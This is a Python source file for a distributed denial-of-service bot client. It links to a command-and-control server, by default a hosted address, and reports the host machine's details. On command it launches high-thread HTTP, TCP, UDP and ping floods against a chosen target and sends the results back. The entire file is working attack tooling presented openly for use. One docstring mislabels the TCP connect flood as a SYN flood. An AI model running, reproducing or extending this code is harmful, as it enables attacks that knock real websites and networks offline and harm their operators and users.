#!/usr/bin/env python3
"""
C2 Client - Real Layer 4-7 Attack with MAXIMUM POWER
Uses urllib3 for extreme performance
"""
import socketio
import socket
import random
import string
import threading
import time
import sys
import os
import platform
import psutil
import urllib3
import subprocess
from datetime import datetime
from urllib.parse import urlparse, urlencode
from concurrent.futures import ThreadPoolExecutor

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class PowerfulAttackEngine:
    """Ultra-powerful attack engine using urllib3 for maximum speed"""
    
    def __init__(self):
        self.running = False
        self.stats = {
            'requests': 0,
            'success': 0,
            'failed': 0,
            'bytes_sent': 0
        }
        self.stats_lock = threading.Lock()
        self.pools = []
        
    def generate_user_agent(self):
        """Generate random user agent"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        return random.choice(agents)
    
    # ============= HTTP ATTACKS =============
    
    def http_power_flood(self, target, duration, method='GET', threads=500):
        """Powerful HTTP flood using urllib3 pools"""
        print(f"[L7] Starting POWERFUL {method} flood on {target}")
        self.running = True
        
        # Create multiple connection pools for maximum speed
        pool_count = 50
        for _ in range(pool_count):
            pool = urllib3.PoolManager(
                maxsize=1000,
                retries=urllib3.Retry(
                    total=2,
                    backoff_factor=0.1,
                    status_forcelist=[429, 500, 502, 503, 504]
                ),
                timeout=urllib3.Timeout(connect=3, read=6),
                cert_reqs='CERT_NONE',
                assert_hostname=False,
                num_pools=50,
                block=False
            )
            self.pools.append(pool)
        
        # Pre-generate headers
        headers_list = []
        for _ in range(100):
            headers = {
                'User-Agent': self.generate_user_agent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Upgrade-Insecure-Requests': '1'
            }
            headers_list.append(headers)
        
        # Pre-generate paths and payloads
        paths = ['/', '/index.html', '/api', '/search', '/login', '/user']
        payloads = [
            b'data=test&type=check',
            b'{"action":"ping"}',
            b'test=' + b'x' * 1024
        ]
        
        start_time = time.time()
        request_count = 0
        
        def worker():
            nonlocal request_count
            pool_idx = 0
            
            while self.running and time.time() - start_time < duration:
                try:
                    # Rotate pools
                    pool = self.pools[pool_idx % len(self.pools)]
                    pool_idx += 1
                    
                    # Build URL with cache busting
                    timestamp = int(time.time() * 1000)
                    path = random.choice(paths)
                    url = f"{target.rstrip('/')}{path}?_={timestamp}&r={random.randint(1,999999)}"
                    
                    # Rotate headers
                    headers = random.choice(headers_list)
                    
                    # Prepare request
                    kwargs = {
                        'headers': headers,
                        'timeout': urllib3.Timeout(connect=2, read=4),
                        'retries': False,
                        'preload_content': False
                    }
                    
                    if method == 'POST':
                        kwargs['body'] = random.choice(payloads)
                        headers['Content-Type'] = 'application/x-www-form-urlencoded'
                    
                    # Send request
                    response = pool.request(method, url, **kwargs)
                    
                    with self.stats_lock:
                        self.stats['requests'] += 1
                        if response.status < 500:
                            self.stats['success'] += 1
                        else:
                            self.stats['failed'] += 1
                    
                    response.drain_conn()
                    request_count += 1
                    
                except Exception:
                    with self.stats_lock:
                        self.stats['failed'] += 1
        
        # Start worker threads
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]
            
            # Wait for completion
            while time.time() - start_time < duration and self.running:
                time.sleep(0.5)
            
            self.running = False
            
            # Cancel remaining
            for future in futures:
                future.cancel()
        
        # Cleanup pools
        for pool in self.pools:
            try:
                pool.clear()
            except:
                pass
        
        return self.stats.copy()
    
    # ============= TCP ATTACKS =============
    
    def tcp_power_flood(self, target, duration, threads=200):
        """Powerful TCP SYN flood"""
        print(f"[L4] Starting POWERFUL TCP flood on {target}")
        self.running = True
        
        parsed = urlparse(target) if target.startswith('http') else type('obj', (object,), {'netloc': target})()
        host = parsed.netloc.split(':')[0] if hasattr(parsed, 'netloc') else target.split(':')[0]
        port = int(parsed.netloc.split(':')[1]) if ':' in (parsed.netloc if hasattr(parsed, 'netloc') else target) else 80
        
        start_time = time.time()
        
        def worker():
            while self.running and time.time() - start_time < duration:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.1)
                    s.connect((host, port))
                    
                    # Send random data
                    data = os.urandom(random.randint(100, 1024))
                    s.send(data)
                    s.close()
                    
                    with self.stats_lock:
                        self.stats['requests'] += 1
                        self.stats['success'] += 1
                        self.stats['bytes_sent'] += len(data)
                except:
                    with self.stats_lock:
                        self.stats['failed'] += 1
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]
            
            while time.time() - start_time < duration and self.running:
                time.sleep(0.5)
            
            self.running = False
            
            for future in futures:
                future.cancel()
        
        return self.stats.copy()
    
    # ============= UDP ATTACKS =============
    
    def udp_power_flood(self, target, duration, threads=100):
        """Powerful UDP flood"""
        print(f"[L4] Starting POWERFUL UDP flood on {target}")
        self.running = True
        
        parsed = urlparse(target) if target.startswith('http') else type('obj', (object,), {'netloc': target})()
        host = parsed.netloc.split(':')[0] if hasattr(parsed, 'netloc') else target.split(':')[0]
        port = int(parsed.netloc.split(':')[1]) if ':' in (parsed.netloc if hasattr(parsed, 'netloc') else target) else 80
        
        start_time = time.time()
        
        # Pre-generate payloads
        payloads = [os.urandom(size) for size in [256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65507]]
        
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while self.running and time.time() - start_time < duration:
                try:
                    payload = random.choice(payloads)
                    sock.sendto(payload, (host, port))
                    
                    with self.stats_lock:
                        self.stats['requests'] += 1
                        self.stats['success'] += 1
                        self.stats['bytes_sent'] += len(payload)
                except:
                    with self.stats_lock:
                        self.stats['failed'] += 1
            
            sock.close()
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]
            
            while time.time() - start_time < duration and self.running:
                time.sleep(0.5)
            
            self.running = False
            
            for future in futures:
                future.cancel()
        
        return self.stats.copy()
    
    # ============= ICMP ATTACKS =============
    
    def icmp_power_flood(self, target, duration, threads=50):
        """Powerful ICMP flood"""
        print(f"[L3] Starting POWERFUL ICMP flood on {target}")
        self.running = True
        
        host = urlparse(target).netloc if target.startswith('http') else target
        host = host.split(':')[0]
        
        start_time = time.time()
        system = platform.system().lower()
        
        def worker():
            while self.running and time.time() - start_time < duration:
                try:
                    if system == "windows":
                        cmd = f"ping -n 1 -w 100 -l 1024 {host}"
                    else:
                        cmd = f"ping -c 1 -W 1 -s 1024 {host}"
                    
                    result = subprocess.run(cmd, shell=True, capture_output=True, timeout=1)
                    
                    with self.stats_lock:
                        self.stats['requests'] += 1
                        if result.returncode == 0:
                            self.stats['success'] += 1
                        else:
                            self.stats['failed'] += 1
                except:
                    with self.stats_lock:
                        self.stats['failed'] += 1
                
                time.sleep(0.01)
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(worker) for _ in range(threads)]
            
            while time.time() - start_time < duration and self.running:
                time.sleep(0.5)
            
            self.running = False
            
            for future in futures:
                future.cancel()
        
        return self.stats.copy()

class Layer7Client:
    """Client with POWERFUL attack capabilities"""
    
    def __init__(self, server_url='http://localhost:5000', client_name=None):
        self.server_url = server_url
        self.client_name = client_name or f"{platform.node()}_{platform.system()}"
        
        self.sio = socketio.Client(
            reconnection=True,
            reconnection_attempts=0,
            reconnection_delay=1,
            reconnection_delay_max=5,
            logger=False,
            engineio_logger=False
        )
        
        self.current_attack = None
        self.running = False
        self.attack_thread = None
        self.attack_engine = PowerfulAttackEngine()
        
        self.setup_handlers()
        
        self.client_info = {
            'name': self.client_name,
            'hostname': platform.node(),
            'platform': platform.platform(),
            'cpu_count': psutil.cpu_count(),
            'memory_total': psutil.virtual_memory().total,
            'python_version': platform.python_version(),
            'has_layer7': True
        }
    
    def setup_handlers(self):
        """Setup SocketIO event handlers"""
        @self.sio.event
        def connect():
            print(f"✅ Connected to C2 Server: {self.server_url}")
            self.register_client()
        
        @self.sio.event
        def connect_error(data):
            print(f"❌ Connection failed: {data}")
            print("💡 Retrying connection...")
        
        @self.sio.event
        def disconnect():
            print("❌ Disconnected from server")
            print("🔄 Attempting to reconnect...")
            self.running = False
        
        @self.sio.event
        def welcome(data):
            print(f"📢 Server: {data['message']}")
        
        @self.sio.event
        def attack_command(data):
            print(f"\n🎯 Received attack command")
            print(f"   Target: {data.get('target')}")
            print(f"   Method: {data.get('method')}")
            print(f"   Duration: {data.get('duration')}s")
            
            if data.get('command') == 'start':
                self.current_attack = data.get('attack_id')
                self.start_attack(data)
            elif data.get('command') == 'stop':
                self.stop_attack()
    
    def register_client(self):
        """Register client with server"""
        try:
            self.sio.emit('client_register', self.client_info)
            print(f"✅ Registered as: {self.client_name}")
        except Exception as e:
            print(f"⚠️ Registration error: {e}")
    
    def start_attack(self, attack_data):
        """Start attack execution"""
        if self.attack_thread and self.attack_thread.is_alive():
            print("⚠️ Another attack is already running")
            return
        
        self.running = True
        self.attack_thread = threading.Thread(
            target=self.execute_attack,
            args=(attack_data,),
            daemon=True
        )
        self.attack_thread.start()
        
        try:
            self.sio.emit('attack_started', {
                'attack_id': attack_data.get('attack_id'),
                'target': attack_data.get('target')
            })
        except Exception as e:
            print(f"⚠️ Failed to notify server: {e}")
    
    def execute_attack(self, attack_data):
        """Execute POWERFUL attack"""
        attack_id = attack_data.get('attack_id')
        target = attack_data.get('target')
        method = attack_data.get('method', 'http').lower()
        duration = attack_data.get('duration', 60)
        
        # Calculate thread count based on CPU
        cpu_count = psutil.cpu_count()
        
        # Set aggressive thread counts
        thread_counts = {
            'http': min(cpu_count * 100, 500),
            'get': min(cpu_count * 100, 500),
            'post': min(cpu_count * 100, 500),
            'tcp': min(cpu_count * 50, 200),
            'udp': min(cpu_count * 25, 100),
            'icmp': min(cpu_count * 10, 50),
            'ping': min(cpu_count * 10, 50)
        }
        threads = thread_counts.get(method, 500)
        
        try:
            print(f"\n{'='*60}")
            print(f"💥 EXECUTING POWERFUL ATTACK")
            print(f"   Target: {target}")
            print(f"   Method: {method.upper()}")
            print(f"   Duration: {duration}s")
            print(f"   Threads: {threads}")
            print(f"   Power: MAXIMUM")
            print(f"{'='*60}\n")
            
            start_time = time.time()
            
            # Reset stats
            self.attack_engine.stats = {
                'requests': 0, 'success': 0, 'failed': 0, 'bytes_sent': 0
            }
            
            # Execute powerful attack
            if method in ['http', 'get']:
                results = self.attack_engine.http_power_flood(target, duration, 'GET', threads)
            elif method == 'post':
                results = self.attack_engine.http_power_flood(target, duration, 'POST', threads)
            elif method == 'tcp':
                results = self.attack_engine.tcp_power_flood(target, duration, threads)
            elif method == 'udp':
                results = self.attack_engine.udp_power_flood(target, duration, threads)
            elif method in ['icmp', 'ping']:
                results = self.attack_engine.icmp_power_flood(target, duration, threads)
            else:
                results = self.attack_engine.http_power_flood(target, duration, 'GET', threads)
            
            elapsed = time.time() - start_time
            actual_rps = results['requests'] / elapsed if elapsed > 0 else 0
            success_rate = (results['success'] / results['requests'] * 100) if results['requests'] > 0 else 0
            
            # Report completion
            try:
                self.sio.emit('attack_complete', {
                    'attack_id': attack_id,
                    'results': {
                        'requests': results['requests'],
                        'success': success_rate,
                        'rps': actual_rps,
                        'duration': elapsed,
                        'method': method,
                        'bytes_sent': results['bytes_sent']
                    }
                })
            except Exception as e:
                print(f"⚠️ Failed to report completion: {e}")
            
            print(f"\n✅ Attack completed in {elapsed:.1f}s")
            print(f"   💥 Total Requests: {results['requests']:,}")
            print(f"   ✅ Successful: {results['success']:,}")
            print(f"   ❌ Failed: {results['failed']:,}")
            print(f"   ⚡ RPS: {actual_rps:.1f}")
            print(f"   📊 Success Rate: {success_rate:.1f}%")
            print(f"   📦 Data Sent: {results['bytes_sent'] / 1024 / 1024:.2f} MB")
            
        except Exception as e:
            print(f"\n❌ Attack error: {str(e)}")
            try:
                self.sio.emit('attack_error', {
                    'attack_id': attack_id,
                    'error': str(e)
                })
            except:
                pass
        finally:
            self.running = False
            self.attack_engine.running = False
            self.current_attack = None
    
    def stop_attack(self):
        """Stop current attack"""
        self.running = False
        self.attack_engine.running = False
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=5)
        self.current_attack = None
        print("🛑 Attack stopped by server")
    
    def report_stats(self):
        """Report statistics to server"""
        while True:
            try:
                if self.sio.connected and not self.running:
                    cpu_usage = psutil.cpu_percent(interval=1)
                    memory_usage = psutil.virtual_memory().percent
                    
                    stats = {
                        'cpu_usage': cpu_usage,
                        'memory_usage': memory_usage,
                        'timestamp': datetime.now().isoformat()
                    }
                    
                    self.sio.emit('client_stats', {'stats': stats})
                
                time.sleep(10)
            except:
                time.sleep(10)
    
    def connect(self):
        """Connect to server and start monitoring"""
        try:
            print("\n" + "="*60)
            print("💥 LAYER7 POWERFUL ATTACK CLIENT")
            print(f"🔗 Connecting to: {self.server_url}")
            print(f"🏷️  Client: {self.client_name}")
            print(f"💻 Platform: {platform.platform()}")
            print(f"⚡ CPUs: {psutil.cpu_count()} cores")
            print(f"💾 RAM: {psutil.virtual_memory().total / 1024 / 1024 / 1024:.1f} GB")
            print(f"🔥 Power Level: MAXIMUM")
            print("="*60 + "\n")
            
            print("⚡ Connecting...")
            print("📡 This may take 10-30 seconds for Render servers...")
            
            self.sio.connect(
                self.server_url,
                wait_timeout=30,
                transports=['websocket', 'polling']
            )
            
            print("\n✅ Connection successful!")
            print("📡 Waiting for attack commands from server...")
            print("⚡ Press Ctrl+C to disconnect\n")
            
            stats_thread = threading.Thread(target=self.report_stats, daemon=True)
            stats_thread.start()
            
            while True:
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n🛑 Client stopped by user")
            self.disconnect()
        except Exception as e:
            print(f"\n❌ Connection error: {str(e)}")
            print("\n💡 Troubleshooting tips:")
            print("   1. Check if server URL is correct")
            print("   2. Make sure server is running")
            print("   3. Check your internet connection")
            print("   4. Wait 30s if server was sleeping")
            self.disconnect()
    
    def disconnect(self):
        """Disconnect from server"""
        self.running = False
        self.attack_engine.running = False
        if self.sio.connected:
            try:
                self.sio.disconnect()
            except:
                pass

def main():
    """Main function"""
    print("""
    ╔══════════════════════════════════════╗
    ║    LAYER7 POWERFUL ATTACK CLIENT    ║
    ║    Maximum Performance Engine       ║
    ║    Layer 3-7 Support               ║
    ╚══════════════════════════════════════╝
    """)
    
    default_server = "https://c2-server-io.onrender.com"
    
    server_url = input(f"🌐 C2 Server URL [{default_server}]: ").strip()
    if not server_url:
        server_url = default_server
    
    if not server_url.startswith('http'):
        server_url = 'https://' + server_url
    
    client_name = input(f"🏷️  Client Name [{platform.node()}]: ").strip()
    if not client_name:
        client_name = platform.node()
    
    client = Layer7Client(server_url=server_url, client_name=client_name)
    client.connect()

if __name__ == "__main__":
    main()
